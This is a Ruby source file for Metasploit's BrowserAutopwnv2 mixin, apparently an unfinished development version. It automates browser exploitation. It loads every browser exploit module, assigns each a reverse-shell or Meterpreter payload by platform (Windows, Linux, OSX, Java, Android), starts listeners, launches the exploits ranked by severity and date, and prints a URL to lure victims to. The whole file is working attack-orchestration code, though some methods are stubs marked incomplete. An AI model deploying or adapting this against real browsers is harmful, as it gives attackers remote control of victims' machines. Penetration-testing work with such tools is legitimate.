###
#
# The Msf::Exploit::Remote::BrowserAutopwnv2 mixin is a replacement for the current BrowserAutoPwn
#
###

require 'Date'

module Msf
  module Exploit::Remote::BrowserAutopwnv2

    # Exception specific for Msf::Exploit::Remote::BrowserAutopwnv2
    class BAPv2Exception < RuntimeError; end

    include Msf::Exploit::Remote::BrowserExploitServer

    # @return [Array] A list of initialized BAP exploits
    attr_reader :bap_exploits


    # The default platform-specific payloads and preferred LPORTS.
    # The hash key is the name of the platform that matches what's on the module.
    # The loader order is specific.
    DEFAULT_PAYLOADS = {
      'win'     => { 'payload' => 'windows/meterpreter/reverse_tcp', 'lport' => 4444 },
      'linux'   => { 'payload' => 'linux/meterpreter/reverse_tcp',   'lport' => 4445 },
      'osx'     => { 'payload' => 'osx/meterpreter/reverse_tcp',     'lport' => 4446 },
      'java'    => { 'payload' => 'java/meterpreter/reverse_tcp',    'lport' => 4447 },
      'android' => { 'payload' => 'android/meterpreter/reverse_tcp', 'lport' => 4448 },
#      'firefox' => { 'payload' => 'firefox/shell_reverse_tcp',       'lport' => 4449 },
      'generic' => { 'payload' => 'generic/shell_reverse_tcp',       'lport' => 4450 }
    }


    # Returns all the found exploit modules that support BrowserExploitServer by going through all
    # the exploits from the framework object.
    #
    # @note This method is using framework.exploits and it's one of the reasons why it's so slow.
    # @todo Maybe look for a different way to get a list of exploits.
    # @return [Array] A collection of BES modules in this format: [module_fullname, Class].
    def init_exploit_paths
      framework.exploits.find_all do |m|
        next if !m.first.include?('browser') || m.last == "__SYMBOLIC__" || m.last.fullname == self.fullname
        m.last.ancestors.include? Msf::Exploit::Remote::BrowserExploitServer
      end
    end


    # Initializes the @bap_exploits instance variable with all the found BAP exploits.
    #
    # @see #bap_exploits The read-only attribute.
    # @return [void]
    def init_exploits
      @bap_exploits = [] # Initialized BES modules are held here

      init_exploit_paths.each do |m|
        module_name = m.first
        xploit = framework.exploits.create(module_name)
        unless xploit
          print_status("Failed to load: #{name}")
          next
        end
        set_exploit_options(xploit)
        @bap_exploits << xploit
      end
    end


    # Prints BAP module names
    #
    # @return [void]
    def list_bap_names
      bap_exploits.each do |m|
        print_status(m.fullname)
      end
    end


    # Modifies an exploit's default datastore options.
    #
    # @return [void]
    def set_exploit_options(xploit)
      p = pick_default_payload(xploit)
      xploit.datastore['DisablePayloadHandler'] = true            # BAP should handle the handlers
      xploit.datastore['PAYLOAD'] = p['payload']                  # We'll need this information later for multi handler
      xploit.datastore['LPORT']   = p['lport']                    # We'll need this information later for multi handler
      xploit.datastore['SSL'] = datastore['SSL']                  # Use SSL or not
      xploit.datastore['SSLVersion'] = datastore['SSLVersion']    # SSL Version
      xploit.datastore['LHOST'] = datastore['LHOST'] || '0.0.0.0' # Attacker's IP
      xploit.datastore['URIPATH'] = "/#{assign_module_resource}"   # A unique resource URI for the exploit
      xploit.datastore['MODULEOWNER'] = 'BAP'                      # Let other mixins know we're in BrowserAutoPwn mode
    end


    # Checks if a resource is already taken or not.
    #
    # @return [TrueClass] Resource is taken.
    # @return [FalseClass] Resource is not taken.
    def is_resource_taken?(resource)
      taken = false

      bap_exploits.each do |m|
        return true if m.datastore['URI'] == resource
      end

      taken
    end


    # Returns a unique resource path.
    #
    # @return [String] A unique resource path.
    def assign_module_resource
      resource = ''
      while
        resource = Rex::Text.rand_text_alpha(rand(10) + 4)
        break unless is_resource_taken?(resource)
      end

      resource
    end


    # Returns a preferred default payload. The load order is based on this preference:
    # if there is a browser-specific payload (such as firefox), then we'll use that as default.
    # And then we fall back to the module's platform. If there's nothing we can choose,
    # then we'll just use the generic reverse shell.
    #
    # @see DEFAULT_PAYLOADS
    # @param [Class] The initialized exploit object.
    # @return [Hash] The default payload information from DEFAULT_PAYLOADS.
    def pick_default_payload(m)
      module_platforms = m.platform.platforms
      preferred_payload = DEFAULT_PAYLOADS['generic']

      # Specific load order
      if module_platforms.include?('firefox')
        preferred_payload = DEFAULT_PAYLOADS['firefox']
      elsif module_platforms.include?('java')
        preferred_payload = DEFAULT_PAYLOADS['java']
      elsif module_platforms.include?('android')
        preferred_payload = DEFAULT_PAYLOADS['android']
      elsif module_platforms.include?('win')
        preferred_payload = DEFAULT_PAYLOADS['win']
      elsif module_platforms.include?('linux')
        preferred_payload = DEFAULT_PAYLOADS['linux']
      elsif module_platforms.include?('osx')
        preferred_payload = DEFAULT_PAYLOADS['osx']
      end

      preferred_payload
    end


    # Modifies @bap_exploits by sorting. The newest and with the highest ranking goes on top.
    #
    # @see #bap_exploits The read-only attribute.
    # @see #sort_date_in_group The method for sorting by disclosure date
    # @see #sort_group_by_rank The method for sorting by rank
    # @see #sort_bap_modules The method for breaking the module list into groups
    # @see #finalize_sorted_modules The method for finalizing bap_exploits
    # @return [void]
    def sort_bap_exploits
      bap_groups = group_bap_modules
      bap_groups = sort_date_in_group(bap_groups)
      bap_groups = sort_group_by_rank(bap_groups)
      finalize_sorted_modules(bap_groups)
    end


    # Sorts a grouped module list by disclosure date.
    #
    # @param [Hash] A grouped module list.
    # @return [Hash] A hash with each module list sorted by disclosure date.
    def sort_date_in_group(bap_groups)
      bap_groups.each_pair do |ranking, module_list|
        bap_groups[ranking] = module_list.sort_by {|m| Date.parse(m.disclosure_date.to_s)}.reverse
      end
    end


    # Sorts a module list by ranking.
    #
    # @param [Hash] A grouped module list.
    # @return [Hash] A hash grouped by ranking.
    def sort_group_by_rank(bap_groups)
      Hash[bap_groups.sort_by {|k,v| k}.reverse]
    end


    # Breaks @bap_exploits into groups for sorting purposes.
    #
    # @return [Hash] A module list grouped by rank.
    def group_bap_modules
      bap_groups = {}
      RankingName.each_pair do |ranking, value|
        bap_groups[ranking] = []
        bap_exploits.each do |m|
          next if m.rank != ranking
          bap_groups[ranking] << m
        end
      end
      bap_groups
    end


    # Modifies @bap_exploit by replacing it with the rearranged module list.
    #
    # @see #bap_exploits The read-only attribute.
    # @param [Hash] A grouped module list.
    # @return [void]
    def finalize_sorted_modules(bap_groups)
      @bap_exploits = []
      bap_groups.each_pair do |ranking, module_list|
        module_list.each do |m|
          @bap_exploits << m
        end
      end
    end


    # Creates payload listeners.
    #
    # @note INCOMPLETE
    # @return [void]
    def start_payload_listeners
      DEFAULT_PAYLOADS.each_pair do |platform, listener_info|
        multi_handler = framework.modules.create('exploit/multi/handler')
        multi_handler.datastore['PAYLOAD'] = listener_info['payload']
        multi_handler.datastore['LPORT'] = listener_info['lport']
        multi_handler.datastore['EXITONSESSION'] = false
        multi_handler.datastore['EXITFUNC'] = 'thread'
#        multi_handler.datastore['ReverseListenerBindAddress'] = datastore['ReverseListenerBindAddress']
        multi_handler.exploit_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'Payload' => listener_info['payload'],
          'RunAsJob' => true
        )
        #$stderr.puts multi_handler.inspect
      end
    end


    # Returns a list of suitable exploits for the current target.
    #
    # @param [Hash] Target's information such as the OS, browser, 3rd-party plugins, etc.
    # @return [Array] A list of suitable exploits to use against the target.
    def find_suitable_exploits(target_info)
      $stderr.puts target_info.inspect
    end


    def parse_rank(rank)
      rank_str = ''

      case rank
      when 0
        rank_str = 'Manual'
      when 100
        rank_str = 'Low'
      when 200
        rank_str = 'Average'
      when 300
        rank_str = 'Normal'
      when 400
        rank_str = 'Good'
      when 500
        rank_str = 'Great'
      when 600
        rank_str = 'Excellent'
      end

      rank_str
    end


    def select_payload(m)
      selected_payload = DEFAULT_PAYLOADS['generic']['payload']
      DEFAULT_PAYLOADS.each_pair do |p, info|
        preferred = info['payload']
        m.compatible_payloads.each do |k|
          return preferred if k[0] == preferred
        end
      end

      selected_payload
    end


    def start_exploits
      order = 1
      table = Rex::Ui::Text::Table.new(
        "Header"  => "Exploits",
        "Indent"  => 1,
        "Columns" => ["Order", "Rank", "Name", "URI"]
      )

      bap_exploits.each do |m|
        m.exploit_simple(
          'LocalInput'     => self.user_input,
          'LocalOutput'    => self.user_output,
          'Target'         => 0,
          'Payload'        => select_payload(m),
          'RunAsJob'       => true
        )
        table << [order.to_s, parse_rank(rank), m.shortname, m.get_resource]
        order += 1
      end

      print_line
      print_status("The following is a list of exploits that are ready for BrowserAutopwn.")
      print_status("Exploits with the highest ranking and newest will be tried first.")
      print_line
      print_line table.to_s
    end


    # Sets up BAPv2. This is like our main function.
    #
    # @see #init_exploits
    # @see #sort_bap_exploits
    # @return [void]
    def setup
      t1 = Time.now
      self.datastore['MODULEOWNER'] = 'BAP'
      super
      print_status("Searching BES exploits, please wait...")
      init_exploits
      sort_bap_exploits
      print_status("#{@bap_exploits.length} BES exploits found.")

      print_status("Starting listeners...")
      start_payload_listeners
      print_status("Starting exploit modules...")
      start_exploits
      t2 = Time.now
      print_line
      print_status("Time spent: #{(t2-t1).inspect}")
    end

    def start_service
      super
      print_status("Please use the following URL for the browser attack:")
      print_status("BrowserAutoPwn URL: #{self.get_uri}")
    end

  end
end
